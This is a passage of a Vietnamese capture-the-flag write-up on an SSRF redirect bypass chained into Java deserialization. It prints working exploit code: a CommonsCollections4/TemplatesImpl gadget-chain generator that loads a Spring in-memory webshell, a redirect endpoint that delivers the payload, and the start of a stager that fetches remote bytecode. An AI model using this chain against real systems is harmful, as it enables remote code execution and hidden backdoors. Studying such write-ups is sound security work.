</span></span><span style="display:flex;"><span>            curl_command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result<span style="color:#f92672">.</span>stdout, <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(e)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error executing curl&#34;</span>}), <span style="color:#ae81ff">500</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_approved</span>(url):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Indicates whether the given URL is allowed to be fetched.  This
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    prevents the server from becoming an open proxy&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    parts <span style="color:#f92672">=</span> urlparse(url)
</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parts<span style="color:#f92672">.</span>hostname
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> parts<span style="color:#f92672">.</span>path
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> parts<span style="color:#f92672">.</span>scheme <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;http&#34;</span>, <span style="color:#e6db74">&#34;https&#34;</span>]:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> host <span style="color:#f92672">in</span> FILTERED_HOSTS:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> filter_path <span style="color:#f92672">in</span> FILTERED_PATHS:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> filter_path <span style="color:#f92672">in</span> path:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span></code></pre></div><p>Con web n√†y nh·∫≠n target_url t·ª´ path v√† make request ƒë·∫øn b·∫±ng curl, tuy nhi√™n target_url b·ªã blacklist m·∫•t host l√† <code>back</code>, ph·∫ßn path th√¨ l√† <code>&quot;debug&quot;, &quot;info&quot;, &quot;ticket&quot;</code> ==&gt; Kh√¥ng th·ªÉ g·ªçi tr·ª±c ti·∫øp ƒë·∫øn <code>back</code> c≈©ng nh∆∞ entrypoint <code>ticket</code> ƒë·ªÉ deser.
<img src="/images/2023/SVATTT-2023_new-waf-deser/back.png" alt="back"></p>
<p>Loay hoay t√¨m c√°ch bypass m√¨nh ng·ªìi nh√¨n l·∫°i m·ªõi ƒë·ªÉ √Ω th·∫•y curl command trong function <code>make_request()</code> c√≥ option <code>-L</code> - s·∫Ω follow redirect, v√† ƒë√¢y c≈©ng ch√≠nh l√† c√°ch bypass. M√¨nh host 1 httpserver l√™n v√† redirect url v·ªÅ <code>http://back/</code> sau ƒë√≥ cho service <code>front</code> request ƒë·∫øn b·ªã redirect l√† truy c·∫≠p ƒë∆∞·ª£c service <code>back</code>:
<img src="/images/2023/SVATTT-2023_new-waf-deser/redirect.png" alt="redirect"></p>
<p><img src="/images/2023/SVATTT-2023_new-waf-deser/req_redirect.png" alt="req_redirect"></p>
<h2 id="deser">deser</h2>
<p>V·∫≠y b√¢y gi·ªù m√¨nh ƒë√£ c√≥ th·ªÉ bypass blacklists ·ªü service <code>front</code> v√† g·ª≠i request ƒë·∫øn <code>back</code> ƒë·ªÉ exploit deser, y chang b√†i nƒÉm tr∆∞·ªõc üò±üò±. T·∫•t nhi√™n l√† kh√¥ng, c√°i kh√≥ l√† <code>back</code> kh√¥ng c√≥ outbound (kh√¥ng th·ªÉ b·∫Øn reverse shell, output dns/http,..etc) th√¨ ch·ªâ c√≥ th·ªÉ nghƒ© ƒë·∫øn c√°ch d√πng Spring Echo/Spring Memshell.</p>
<p>Chain <code>CommonsCollections4</code> g·ªçi ƒë·∫øn sink l√† <code>TemplatesImpl</code> ƒë·ªÉ load bytecode, nh·ªù ƒë√≥ ch·∫°y ƒë∆∞·ª£c java code tho·∫£i m√°i ƒë·ªÉ RCE. ƒê·ªÉ s·ª≠a chain thay v√¨ ch·∫°y command m√† load Spring Echo/Spring Memshell th√¨ s·ª≠a class bytecode ƒë∆∞·ª£c load l√† ƒë∆∞·ª£c.</p>
<p>V√¨ kh√¥ng ph·∫£i tr·ªçng t√¢m b√†i n√†y n√™n b·∫°n n√†o ch∆∞a hi·ªÉu chain CC4 c√≥ th·ªÉ ƒë·ªçc <a href="/posts/2023/java-deserialization-p1/">b√†i n√†y c·ªßa m√¨nh</a>, ƒë√£ ph√¢n t√≠ch ph·∫ßn l·ªõn chain s·ª≠ d·ª•ng sink l√† <code>TemplatesImpl</code> (bao g·ªìm CC4).
V·ªÅ Spring Memshel th√¨ v√¨ ch∆∞a c√≥ th·ªùi gian n√™n m√¨nh ch·ªâ m·ªõi <a href="/posts/2023/quick-note-spring-memshell/">quick note nh∆∞ n√†y</a>, ƒë·ªß ƒë·ªÉ d√πng.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// truncated
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ExploitUtils</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">pathEncode</span><span style="color:#f92672">(</span>String s<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\r\\n&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;%3D&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\+&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;%2B&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> bufferSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> ByteArrayOutputStream <span style="color:#a6e22e">gZipEncode</span><span style="color:#f92672">(</span>InputStream inputStream<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        GZIPOutputStream gos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> GZIPOutputStream<span style="color:#f92672">(</span>barr<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>bufferSize<span style="color:#f92672">];</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> len<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span><span style="color:#f92672">((</span>len <span style="color:#f92672">=</span> inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>buffer<span style="color:#f92672">))</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                gos<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>buffer<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">,</span> len<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">finally</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span><span style="color:#f92672">{</span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>inputStream <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();}</span> <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span><span style="color:#f92672">{</span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>gos <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> gos<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();}</span> <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> barr<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">,</span> Object value<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> value<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> ByteArrayOutputStream <span style="color:#a6e22e">genCC4Proxy</span><span style="color:#f92672">(</span>String className<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// get memshell bytecode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">().</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>className<span style="color:#f92672">).</span><span style="color:#a6e22e">toBytecode</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// gen CC4 serialized chain
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>tplsImpl<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>bArr<span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>tplsImpl<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;ahihi&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>tplsImpl<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_tfactory&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> TransformerFactoryImpl<span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ConstantTransformer constTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>TrAXFilter<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span> <span style="color:#75715e">// loop 1 tr·∫£ v·ªÅ TrAXFilter.class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        InstantiateTransformer insTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InstantiateTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>javax<span style="color:#f92672">.</span><span style="color:#a6e22e">xml</span><span style="color:#f92672">.</span><span style="color:#a6e22e">transform</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Templates</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>tplsImpl<span style="color:#f92672">});</span> <span style="color:#75715e">// loop 2 g·ªçi class TrAXFilter constructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
</span></span><span style="display:flex;"><span>                constTransformer<span style="color:#f92672">,</span> insTransformer
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>        TransformingComparator transComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator<span style="color:#f92672">(</span>chainedTransformer<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;(</span>transComparator<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>priorityQueue<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;size&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>priorityQueue<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;queue&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">,</span><span style="color:#ae81ff">1</span><span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span>barr<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        oos<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>priorityQueue<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        oos<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> barr<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">genDeserPayload</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// get CC4 memshell serialized gadget chain then gzip encode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> genCC4Proxy<span style="color:#f92672">(</span>evil<span style="color:#f92672">.</span><span style="color:#a6e22e">MemTemplatesImpl</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>        InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream<span style="color:#f92672">(</span>barr<span style="color:#f92672">.</span><span style="color:#a6e22e">toByteArray</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream outBarr <span style="color:#f92672">=</span> gZipEncode<span style="color:#f92672">(</span>is<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// b64 + path encode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> outBarr<span style="color:#f92672">.</span><span style="color:#a6e22e">toByteArray</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Generated payload length is: &#34;</span> <span style="color:#f92672">+</span> bytes<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        String b64En <span style="color:#f92672">=</span>  Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">getEncoder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">encodeToString</span><span style="color:#f92672">(</span>bytes<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        String info <span style="color:#f92672">=</span> pathEncode<span style="color:#f92672">(</span>b64En<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>info<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> info<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        genDeserPayload<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p><em>MemTemplatesImpl l√† class spring memshell m√¨nh l·∫•y trong b√†i quick note ·ªü tr√™n</em></p>
<p>V√† m√¨nh ƒë√£ th·ª≠ v√† failed:
<img src="/images/2023/SVATTT-2023_new-waf-deser/failed.png" alt="failed"></p>
<p>Payload sau khi gzip c√≥ s·ªë bytes l√† <code>2623</code>, khi send s·∫Ω kh√¥ng v√†o ƒë∆∞·ª£c deser. V·∫´n poc cho c√≥ context. Host httpserver v√† redirect ƒë·∫øn: <code>http://back/ticket/H4sIAAAAA....?compress=true</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tiktikboom&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ticket</span><span style="color:#f92672">(</span>HttpServletResponse httpServletResponse<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        String exploitBackendURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://back/ticket/&#34;</span> <span style="color:#f92672">+</span> ExploitUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">genDeserPayload</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?compress=true&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        httpServletResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">setHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Location&#34;</span><span style="color:#f92672">,</span> exploitBackendURL<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        httpServletResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">setStatus</span><span style="color:#f92672">(</span><span style="color:#ae81ff">301</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span></code></pre></div><p><img src="/images/2023/SVATTT-2023_new-waf-deser/req_failed.png" alt="req_failed"></p>
<p>V·∫≠y serialized chain ch·ª©a memshell l√† qu√° d√†i ƒë·ªÉ exploit deser. Do ƒë√≥ m√¨nh l√™n √Ω t∆∞·ªüng l·∫ßn deser ƒë·∫ßu s·∫Ω ch·∫°y 1 √≠t code, ph·∫ßn code n√†y s·∫Ω request ƒë·∫øn remote server ƒë·ªÉ l·∫•y memshell bytecode sau ƒë√≥ m·ªõi load bytecode n√†y ƒë·ªÉ ch√®n memshell.
What??, nh∆∞ng m√† service <code>back</code> l√†m g√¨ c√≥ outbound. L√∫c ƒë·∫•y m√¨nh m·ªõi ƒë·ªÉ √Ω ƒë√≥ l√† l√Ω do t·∫°i sao service <code>front</code> l·∫°i cho ra internet, c√πng xem l·∫°i file <code>docker-compose.yml</code>, ph·∫ßn <code>networks</code> c·ªßa <code>front</code> n·∫±m ·ªü c·∫£ <code>no-internet</code> (ch·ªâ connect <code>back</code>) v√† <code>internet</code> (c√≥ outbound):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">front</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./front</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_front</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">internet</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8004:5000&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>: 
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">back</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">back</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./back</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_back</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">networks</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">internet</span>: {}
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">no-internet</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">internal</span>: <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><p>C√°c host n·∫±m chung 1 network th√¨ c√≥ th·ªÉ connect v·ªõi nhau, d√≥ ƒë√≥ t·ª´ service <code>back</code> c√≥ th·ªÉ request t·ªõi <code>front</code>. V·∫≠y cu·ªëi c√πng √Ω t∆∞·ªüng s·∫Ω l√† nh∆∞ n√†y:</p>
<ol>
<li><code>Front</code> request ƒë·∫øn <code>httpserver</code>, <code>httpserver</code> return redirect ƒë·∫øn <code>back</code> service v·ªõi chain CC4 deser k√©o remote class bytecode memshell (ProxyTemplatesImpl)</li>
<li><code>Back</code> deser CC4 chain tr√™n v√† ch·∫°y code k√©o remote bytecode, ·ªü ƒë√¢y do kh√¥ng c√≥ outbound, callback URL ra httpserver s·∫Ω ƒëi qua <code>front</code>,  sau ƒë√≥ load bytecode ƒë·ªÉ ch√®n memshell (MemTemplatesImpl)</li>
<li>Memshell ƒë√£ ƒë∆∞·ª£c load, d√πng ti·∫øp httpserver ƒë·ªÉ con <code>front</code> redirect v√† truy c·∫≠p memshell</li>
</ol>
<p>ƒê·ªÉ cho d·ªÖ h√¨nh dung th√¨ l√† nh∆∞ n√†y:
<img src="/images/2023/SVATTT-2023_new-waf-deser/diagram.png" alt="diagram"></p>
<p><code>ProxyTemplatesImpl</code> k√©o bytecode qua <code>front</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ProxyTemplatesImpl</span> <span style="color:#66d9ef">extends</span> AbstractTranslet <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> SerializationHandler<span style="color:#f92672">[]</span> handlers<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> DTMAxisIterator iterator<span style="color:#f92672">,</span> SerializationHandler handler<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>
